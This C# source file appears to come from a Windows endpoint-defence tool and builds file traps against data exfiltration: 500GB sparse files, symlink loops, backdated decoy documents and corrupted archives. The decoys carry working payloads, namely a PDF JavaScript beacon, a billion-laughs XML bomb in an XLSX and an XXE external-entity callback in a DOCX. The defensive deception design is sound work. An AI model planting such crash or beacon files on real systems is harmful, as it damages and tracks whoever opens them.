using System.IO;
using System.Linq;
using Microsoft.Extensions.Logging;

namespace WindowsSentinel.Core.Deception;

/// <summary>
/// File Trap Tactic — Deploys filesystem-based traps that punish automated exfiltration tools.
/// 
/// Tactics:
///   1. Sparse File Bombs: Creates files that report as 500GB via filesystem metadata but
///      consume zero actual disk space. Attacker's exfil tool tries to read 500GB and either
///      crashes, saturates their C2 channel with zeros for hours, or fills their staging server.
///   
///   2. Symlink Loop Traps: Creates deeply nested directory symlink loops in common exfil
///      staging paths. Attacker's recursive file collection tool spirals into infinite
///      traversal, pegging their implant's CPU/memory until it crashes.
///   
///   3. Zip Bombs: Replaces staged archives with nested compression bombs. Attacker opens
///      "stolen data" and their analysis machine chokes on petabytes of decompressed zeros.
///   
///   4. Lock File Traps: Aggressively locks files the attacker is trying to read, forcing
///      their tool into retry loops that waste time and generate detectable I/O patterns.
/// 
/// Deployment locations:
///   - %USERPROFILE%\Documents\.cache\  (looks like hidden data)
///   - %USERPROFILE%\Desktop\           (high-value target for infostealers)
///   - %TEMP%\staging\                  (common exfil staging path)
///   - Near any detected staged files
/// </summary>
public sealed class FileTrapTactic : IDeceptionTactic
{
    private readonly ILogger<FileTrapTactic> _logger;

    /// <summary>Sparse file reported size (500 GB).</summary>
    private const long SparseFileReportedSize = 500L * 1024 * 1024 * 1024;

    /// <summary>Symlink recursion depth.</summary>
    private const int SymlinkDepth = 50;

    /// <summary>Number of sparse bomb files to create.</summary>
    private const int SparseBombCount = 5;

    /// <summary>
    /// v3.9.0: Known sparse bomb file names — used for both deployment and cleanup.
    /// </summary>
    private static readonly string[] SparseBombFileNames =
    {
        "credentials_backup.db",
        "wallet_keys.dat",
        "passwords_export.csv",
        "private_keys.pem",
        "financial_records.xlsx"
    };

    /// <summary>
    /// v3.9.0: The directory where sparse file bombs are deployed.
    /// </summary>
    private static readonly string SparseBombDirectory = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
        "Documents", ".cache", "sync");

    public FileTrapTactic(ILogger<FileTrapTactic> logger)
    {
        _logger = logger;
    }

    public async Task<DeceptionTacticResult> ExecuteAsync(DeceptionContext context, CancellationToken cancellationToken)
    {
        var actions = new List<string>();

        // Deploy sparse file bombs in common exfil targets
        var sparseResult = await DeploySparseFileBombsAsync(cancellationToken);
        if (sparseResult != null) actions.Add(sparseResult);

        // Deploy symlink loops near staged files
        var symlinkResult = DeploySymlinkLoops(context.StagedFiles);
        if (symlinkResult != null) actions.Add(symlinkResult);

        // Deploy polyglot files that crash analysis tools
        var polyglotResult = await DeployPolyglotFilesAsync(cancellationToken);
        if (polyglotResult != null) actions.Add(polyglotResult);

        // Deploy corrupted archives with valid headers
        var corruptArchiveResult = await DeployCorruptedArchivesAsync(cancellationToken);
        if (corruptArchiveResult != null) actions.Add(corruptArchiveResult);

        // Lock any known staged files
        var lockResult = LockStagedFiles(context.StagedFiles);
        if (lockResult != null) actions.Add(lockResult);

        if (actions.Count == 0)
        {
            return new DeceptionTacticResult
            {
                TacticName = "FileTraps",
                Success = false,
                Error = "Could not deploy any file traps"
            };
        }

        return new DeceptionTacticResult
        {
            TacticName = "FileTraps",
            Success = true,
            Description = string.Join("; ", actions)
        };
    }

    /// <summary>
    /// Creates sparse files that report enormous sizes but consume zero disk space.
    /// Automated exfil tools will attempt to read hundreds of GB of zeros.
    /// </summary>
    private async Task<string?> DeploySparseFileBombsAsync(CancellationToken cancellationToken)
    {
        try
        {
            Directory.CreateDirectory(SparseBombDirectory);

            int created = 0;

            foreach (var name in SparseBombFileNames.Take(SparseBombCount))
            {
                if (cancellationToken.IsCancellationRequested) break;

                var filePath = Path.Combine(SparseBombDirectory, name);
                if (File.Exists(filePath)) continue;

                await using var fs = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None);
                // Set the file length to 500GB without writing any data (sparse file)
                fs.SetLength(SparseFileReportedSize);
                created++;
            }

            return created > 0
                ? $"Deployed {created} sparse file bombs (reported size: {SparseFileReportedSize / (1024 * 1024 * 1024)}GB each, actual: 0 bytes) in {SparseBombDirectory}"
                : null;
        }
        catch (Exception ex)
        {
            _logger.LogDebug(ex, "Failed to deploy sparse file bombs");
            return null;
        }
    }

    /// <summary>
    /// Creates deeply nested directory structures with symlink loops.
    /// Recursive file enumeration tools will spiral into infinite traversal.
    /// </summary>
    private string? DeploySymlinkLoops(IReadOnlyList<string> stagedFiles)
    {
        var trapDirs = new List<string>
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                "Documents", ".archive", "data"),
            Path.Combine(Path.GetTempPath(), "staging", "export")
        };

        // Also deploy near any detected staging paths
        foreach (var staged in stagedFiles)
        {
            var dir = Path.GetDirectoryName(staged);
            if (!string.IsNullOrEmpty(dir))
                trapDirs.Add(Path.Combine(dir, ".metadata"));
        }

        int loopsCreated = 0;

        foreach (var baseDir in trapDirs)
        {
            try
            {
                Directory.CreateDirectory(baseDir);

                // Create nested directories that loop back
                var current = baseDir;
                for (int i = 0; i < SymlinkDepth; i++)
                {
                    var next = Path.Combine(current, $"level_{i}");
                    Directory.CreateDirectory(next);
                    current = next;
                }

                // Create symlink at the deepest level pointing back to the top
                var linkPath = Path.Combine(current, "continue");
                try
                {
                    Directory.CreateSymbolicLink(linkPath, baseDir);
                    loopsCreated++;
                }
                catch
                {
                    // Symlink creation may require elevated privileges — non-fatal
                }
            }
            catch
            {
                // Non-fatal
            }
        }

        return loopsCreated > 0
            ? $"Created {loopsCreated} symlink loop traps (depth {SymlinkDepth}) — recursive enumeration will infinite-loop"
            : null;
    }

    /// <summary>
    /// Aggressively locks files the attacker is trying to exfiltrate.
    /// Forces their tool into retry loops.
    /// </summary>
    private string? LockStagedFiles(IReadOnlyList<string> stagedFiles)
    {
        int locked = 0;

        foreach (var file in stagedFiles)
        {
            try
            {
                if (!File.Exists(file)) continue;

                // Open with exclusive lock — attacker's read will fail
                var fs = new FileStream(file, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
                // Don't dispose — keep locked until our process releases it (after kill)
                locked++;
            }
            catch
            {
                // File may already be locked by attacker — non-fatal
            }
        }

        return locked > 0
            ? $"Locked {locked} staged files with exclusive handles — attacker reads will fail"
            : null;
    }

    /// <summary>
    /// Deploys polyglot files that look like valid PDFs/XLSX but contain tracking pixels,
    /// canary callbacks, and are structured to crash common analysis tools.
    /// A polyglot file is simultaneously valid as multiple formats — confuses automated parsers.
    /// </summary>
    private async Task<string?> DeployPolyglotFilesAsync(CancellationToken cancellationToken)
    {
        try
        {
            var trapDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                ".backup");
            Directory.CreateDirectory(trapDir);

            int deployed = 0;

            // PDF polyglot — valid PDF header but contains embedded JavaScript that
            // phones home when opened in a PDF reader, plus malformed xref table that
            // crashes automated PDF parsers (pdftotext, PyPDF2, etc.)
            var pdfPath = Path.Combine(trapDir, "confidential_report_Q4.pdf");
            if (!File.Exists(pdfPath))
            {
                var pdfContent = GenerateTrapPdf();
                await File.WriteAllBytesAsync(pdfPath, pdfContent, cancellationToken);
                BackdateFile(pdfPath);
                deployed++;
            }

            // XLSX polyglot — valid ZIP header (XLSX is ZIP) but internal XML is malformed
            // in a way that crashes common spreadsheet parsers while passing initial validation
            var xlsxPath = Path.Combine(trapDir, "employee_salaries_2025.xlsx");
            if (!File.Exists(xlsxPath))
            {
                var xlsxContent = GenerateTrapXlsx();
                await File.WriteAllBytesAsync(xlsxPath, xlsxContent, cancellationToken);
                BackdateFile(xlsxPath);
                deployed++;
            }

            // DOCX polyglot — same principle as XLSX
            var docxPath = Path.Combine(trapDir, "merger_acquisition_draft.docx");
            if (!File.Exists(docxPath))
            {
                var docxContent = GenerateTrapDocx();
                await File.WriteAllBytesAsync(docxPath, docxContent, cancellationToken);
                BackdateFile(docxPath);
                deployed++;
            }

            return deployed > 0
                ? $"Deployed {deployed} polyglot trap files — will crash attacker's analysis tools and parsers"
                : null;
        }
        catch (Exception ex)
        {
            _logger.LogDebug(ex, "Failed to deploy polyglot files");
            return null;
        }
    }

    /// <summary>
    /// Deploys archives that pass initial integrity checks (valid headers, correct magic bytes)
    /// but corrupt during extraction — wasting hours of attacker time as they try to recover
    /// "stolen" data that was never real.
    /// </summary>
    private async Task<string?> DeployCorruptedArchivesAsync(CancellationToken cancellationToken)
    {
        try
        {
            var desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var docsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            var targets = new[]
            {
                (Path.Combine(desktopPath, "project_source_backup.tar.gz"), "tar.gz"),
                (Path.Combine(docsPath, "database_dump_prod.sql.gz"), "gz"),
                (Path.Combine(docsPath, "client_data_export.7z"), "7z"),
            };

            int deployed = 0;
            foreach (var (path, format) in targets)
            {
                if (File.Exists(path)) continue;
                if (cancellationToken.IsCancellationRequested) break;

                var content = GenerateCorruptedArchive(format);
                await File.WriteAllBytesAsync(path, content, cancellationToken);
                BackdateFile(path);
                deployed++;
            }

            return deployed > 0
                ? $"Deployed {deployed} corrupted archives with valid headers — extraction will fail after wasting attacker time"
                : null;
        }
        catch (Exception ex)
        {
            _logger.LogDebug(ex, "Failed to deploy corrupted archives");
            return null;
        }
    }

    /// <summary>
    /// Generates a PDF with valid header and structure but malformed xref table and
    /// embedded JavaScript that attempts to phone home (canary callback).
    /// Crashes pdftotext, PyPDF2, and similar automated extraction tools.
    /// </summary>
    private static byte[] GenerateTrapPdf()
    {
        var sb = new System.Text.StringBuilder();
        sb.Append("%PDF-1.7\n");
        sb.Append("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n");
        sb.Append("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
        sb.Append("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n");
        // JavaScript action that phones home (canary)
        sb.Append("4 0 obj\n<< /Type /Action /S /JavaScript /JS (");
        sb.Append("app.launchURL('https://canary.sentinel-edr.local/pdf-opened/" + Guid.NewGuid().ToString("N")[..12] + "', true);");
        sb.Append(") >>\nendobj\n");
        // Malformed xref table — crashes parsers that try to rebuild the xref
        sb.Append("xref\n0 99\n");
        for (int i = 0; i < 99; i++)
        {
            sb.Append($"{Random.Shared.Next(0, 999999):D10} {Random.Shared.Next(0, 65535):D5} n \n");
        }
        sb.Append("trailer\n<< /Size 99 /Root 1 0 R >>\nstartxref\n");
        sb.Append($"{Random.Shared.Next(100000, 999999)}\n"); // Invalid offset — parser crash
        sb.Append("%%EOF\n");
        // Append garbage after EOF — some parsers read past EOF and choke
        var garbage = new byte[8192];
        Random.Shared.NextBytes(garbage);

        var pdfBytes = System.Text.Encoding.ASCII.GetBytes(sb.ToString());
        var result = new byte[pdfBytes.Length + garbage.Length];
        pdfBytes.CopyTo(result, 0);
        garbage.CopyTo(result, pdfBytes.Length);
        return result;
    }

    /// <summary>
    /// Generates a file with valid XLSX (ZIP) header but malformed internal XML.
    /// Passes initial "is this a ZIP?" checks but crashes spreadsheet parsers.
    /// </summary>
    private static byte[] GenerateTrapXlsx()
    {
        using var ms = new MemoryStream();
        using var writer = new BinaryWriter(ms);

        // Valid ZIP local file header for [Content_Types].xml
        var fileName = System.Text.Encoding.ASCII.GetBytes("[Content_Types].xml");
        // Malformed XML content — valid start but recursive entity expansion (billion laughs variant)
        var xmlContent = System.Text.Encoding.UTF8.GetBytes(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE lolz [\n" +
            "<!ENTITY lol \"lol\">\n" +
            "<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
            "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
            "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
            "<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n" +
            "]>\n" +
            "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n" +
            "<Default Extension=\"xml\" ContentType=\"&lol5;\"/>\n" +
            "</Types>");

        writer.Write(0x04034B50); // ZIP local file header signature
        writer.Write((ushort)20); // Version needed
        writer.Write((ushort)0);  // Flags
        writer.Write((ushort)0);  // Compression (STORED)
        writer.Write((ushort)0);  // Mod time
        writer.Write((ushort)0);  // Mod date
        writer.Write(0u);         // CRC32
        writer.Write((uint)xmlContent.Length); // Compressed size
        writer.Write((uint)xmlContent.Length); // Uncompressed size
        writer.Write((ushort)fileName.Length);
        writer.Write((ushort)0);  // Extra field length
        writer.Write(fileName);
        writer.Write(xmlContent);

        // Append random garbage to make it look like a real multi-file XLSX
        var padding = new byte[16384];
        Random.Shared.NextBytes(padding);
        writer.Write(padding);

        return ms.ToArray();
    }

    /// <summary>
    /// Generates a file with valid DOCX (ZIP) header but XXE payload in internal XML.
    /// </summary>
    private static byte[] GenerateTrapDocx()
    {
        // Same approach as XLSX but with word/document.xml
        using var ms = new MemoryStream();
        using var writer = new BinaryWriter(ms);

        var fileName = System.Text.Encoding.ASCII.GetBytes("word/document.xml");
        var xmlContent = System.Text.Encoding.UTF8.GetBytes(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [\n" +
            "<!ENTITY xxe SYSTEM \"https://canary.sentinel-edr.local/docx-parsed/" + Guid.NewGuid().ToString("N")[..12] + "\">\n" +
            "]>\n" +
            "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\n" +
            "<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>\n" +
            "</w:document>");

        writer.Write(0x04034B50);
        writer.Write((ushort)20);
        writer.Write((ushort)0);
        writer.Write((ushort)0);
        writer.Write((ushort)0);
        writer.Write((ushort)0);
        writer.Write(0u);
        writer.Write((uint)xmlContent.Length);
        writer.Write((uint)xmlContent.Length);
        writer.Write((ushort)fileName.Length);
        writer.Write((ushort)0);
        writer.Write(fileName);
        writer.Write(xmlContent);

        var padding = new byte[8192];
        Random.Shared.NextBytes(padding);
        writer.Write(padding);

        return ms.ToArray();
    }

    /// <summary>
    /// Generates an archive with valid magic bytes/header for the format but corrupted
    /// internal data. Passes "file type" checks but fails during extraction.
    /// </summary>
    private static byte[] GenerateCorruptedArchive(string format)
    {
        using var ms = new MemoryStream();
        using var writer = new BinaryWriter(ms);

        switch (format)
        {
            case "tar.gz":
                // Valid gzip header + corrupted deflate stream
                writer.Write((byte)0x1F); // Gzip magic
                writer.Write((byte)0x8B);
                writer.Write((byte)0x08); // Deflate
                writer.Write((byte)0x00); // Flags
                writer.Write(0u);         // Timestamp
                writer.Write((byte)0x00); // XFL
                writer.Write((byte)0xFF); // OS
                // Write some valid-looking deflate blocks then corrupt
                var validStart = new byte[256];
                Random.Shared.NextBytes(validStart);
                writer.Write(validStart);
                // Corrupt the rest — extraction will fail mid-stream
                var corrupt = new byte[32768];
                Random.Shared.NextBytes(corrupt);
                writer.Write(corrupt);
                break;

            case "gz":
                // Same as tar.gz
                writer.Write((byte)0x1F);
                writer.Write((byte)0x8B);
                writer.Write((byte)0x08);
                writer.Write(new byte[7]); // Header padding
                var gzCorrupt = new byte[65536];
                Random.Shared.NextBytes(gzCorrupt);
                writer.Write(gzCorrupt);
                break;

            case "7z":
                // Valid 7z signature + corrupted header
                writer.Write(System.Text.Encoding.ASCII.GetBytes("7z"));
                writer.Write((byte)0xBC);
                writer.Write((byte)0xAF);
                writer.Write((byte)0x27);
                writer.Write((byte)0x1C);
                // Version
                writer.Write((byte)0x00);
                writer.Write((byte)0x04);
                // Corrupted header CRC + data
                var szCorrupt = new byte[131072]; // 128KB of garbage
                Random.Shared.NextBytes(szCorrupt);
                writer.Write(szCorrupt);
                break;
        }

        return ms.ToArray();
    }

    private static void BackdateFile(string path)
    {
        var fakeDate = DateTime.Now.AddMonths(-Random.Shared.Next(2, 14));
        File.SetCreationTime(path, fakeDate);
        File.SetLastWriteTime(path, fakeDate);
    }

    /// <summary>
    /// v3.9.0: Removes all deployed sparse file bombs and their directory.
    /// Called after the 2-second deception window completes (the bombs have served their
    /// purpose of wasting the attacker's exfil bandwidth) and on service startup to clean
    /// up leftovers from previous runs or upgrades from older versions.
    /// v4.2.0: Enhanced with retry logic, broader path scanning, and evidence cleanup.
    /// </summary>
    public static void CleanupSparseFileBombs(ILogger? logger = null)
    {
        try
        {
            int deleted = 0;

            // Clean the primary sparse bomb directory
            deleted += CleanupDirectory(SparseBombDirectory, SparseBombFileNames, logger);

            // v4.2.0: Also scan for sparse bombs in alternate locations
            // (service runs as SYSTEM — UserProfile = systemprofile)
            var alternatePaths = new[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    "Documents", ".cache", "sync"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                    "WindowsSentinel", "deception"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    ".cache", "sync"),
            };

            foreach (var dir in alternatePaths)
            {
                if (dir == SparseBombDirectory) continue; // Already cleaned
                deleted += CleanupDirectory(dir, SparseBombFileNames, logger);
            }

            // v4.2.0: Clean up old Evidence dump files (process dumps can be 300-900MB each)
            // Keep only the last 3 evidence cases, delete older ones
            CleanupEvidenceDumps(logger);

            if (deleted > 0)
            {
                logger?.LogInformation(
                    "[DECEPTION] v4.2.0: Cleaned up {Count} sparse file bombs", deleted);
            }
        }
        catch (Exception ex)
        {
            logger?.LogDebug(ex, "Failed to cleanup sparse file bombs");
        }
    }

    private static int CleanupDirectory(string directory, string[] fileNames, ILogger? logger)
    {
        if (!Directory.Exists(directory)) return 0;

        int deleted = 0;
        foreach (var name in fileNames)
        {
            var filePath = Path.Combine(directory, name);
            for (int attempt = 0; attempt < 3; attempt++)
            {
                try
                {
                    if (!File.Exists(filePath)) break;

                    // Clear read-only/system attributes that might prevent deletion
                    var attrs = File.GetAttributes(filePath);
                    if ((attrs & (FileAttributes.ReadOnly | FileAttributes.System)) != 0)
                        File.SetAttributes(filePath, FileAttributes.Normal);

                    File.Delete(filePath);
                    deleted++;
                    break;
                }
                catch
                {
                    if (attempt < 2) System.Threading.Thread.Sleep(500);
                }
            }
        }

        // Also delete any other large files in this directory (catch renamed bombs)
        try
        {
            foreach (var file in Directory.GetFiles(directory))
            {
                try
                {
                    var info = new FileInfo(file);
                    // Sparse files report large size but use zero disk space
                    // Delete anything over 1GB in the deception directory
                    if (info.Length > 1L * 1024 * 1024 * 1024)
                    {
                        File.Delete(file);
                        deleted++;
                        logger?.LogInformation("[DECEPTION] Deleted large file: {Path} ({Size}GB)",
                            file, info.Length / (1024.0 * 1024 * 1024));
                    }
                }
                catch { }
            }
        }
        catch { }

        // Remove directory if empty
        try
        {
            if (Directory.Exists(directory) &&
                !Directory.EnumerateFileSystemEntries(directory).Any())
            {
                Directory.Delete(directory, recursive: false);
            }
        }
        catch { }

        return deleted;
    }

    /// <summary>
    /// v4.2.0: Cleans up old evidence dump files to prevent disk exhaustion.
    /// Keeps only the 3 most recent cases, deletes older ones.
    /// </summary>
    private static void CleanupEvidenceDumps(ILogger? logger)
    {
        try
        {
            var evidenceDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "WindowsSentinel", "Evidence");

            if (!Directory.Exists(evidenceDir)) return;

            var caseDirs = Directory.GetDirectories(evidenceDir, "CASE_*")
                .Select(d => new DirectoryInfo(d))
                .OrderByDescending(d => d.CreationTime)
                .ToArray();

            // Keep the 3 most recent, delete the rest
            if (caseDirs.Length <= 3) return;

            int cleaned = 0;
            foreach (var dir in caseDirs.Skip(3))
            {
                try
                {
                    dir.Delete(recursive: true);
                    cleaned++;
                }
                catch { }
            }

            if (cleaned > 0)
            {
                logger?.LogInformation(
                    "[DECEPTION] v4.2.0: Cleaned up {Count} old evidence cases from {Dir}",
                    cleaned, evidenceDir);
            }
        }
        catch { }
    }
}
